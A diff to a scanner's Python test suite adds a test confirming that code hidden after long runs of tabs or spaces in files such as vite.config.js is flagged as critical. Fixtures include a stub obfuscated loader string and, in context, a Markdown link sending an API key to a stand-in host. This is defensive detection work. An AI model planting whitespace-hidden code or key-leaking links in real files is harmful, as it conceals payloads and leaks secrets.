@@ -580,6 +580,22 @@ class TestScanSkill:
         doc.write_text("[a] see [report](https://collect.example/?d=${API_KEY})\n", encoding="utf-8")
         assert any(fi.pattern_id == "md_link_exfil" for fi in scan_file(doc, "README.md"))
 
+    def test_code_pushed_off_screen_by_whitespace_is_critical_in_any_text_file(self, tmp_path):
+        """A loader appended after hundreds of tabs (`vite.config.js`) or spaces (extensionless `init`)
+        is invisible in an editor and on GitHub; both are dangerous. A Markdown table padding its
+        cells is not code and stays clean."""
+        loader = "var z = '-1000';var NX,SX;(function(){var a=[String.fromCharCode(118,97,114)]})();"
+        (tmp_path / "vite.config.js").write_text("export default {};" + "\t" * 266 + loader + "\n", encoding="utf-8")
+        (tmp_path / "init").write_text("'use strict';\ninit();" + " " * 774 + loader + "\n", encoding="utf-8")
+        (tmp_path / "table.md").write_text("| a |" + " " * 300 + "| a long table cell that keeps going on |\n",
+                                           encoding="utf-8")
+        (tmp_path / "run.log").write_text("    x = f()\n" + " " * 349 + "~~~~" + "^" * 44 + "\n", encoding="utf-8")
+        assert not [fi for fi in scan_file(tmp_path / "run.log", "run.log") if fi.pattern_id == "hidden_padded_code"]
+        for name, line in (("vite.config.js", 1), ("init", 2)):
+            [hit] = [fi for fi in scan_file(tmp_path / name, name) if fi.pattern_id == "hidden_padded_code"]
+            assert (hit.severity, hit.line) == ("critical", line)
+        assert not [fi for fi in scan_file(tmp_path / "table.md", "table.md") if fi.pattern_id == "hidden_padded_code"]
+
 
 # ---------------------------------------------------------------------------
 # _check_structure
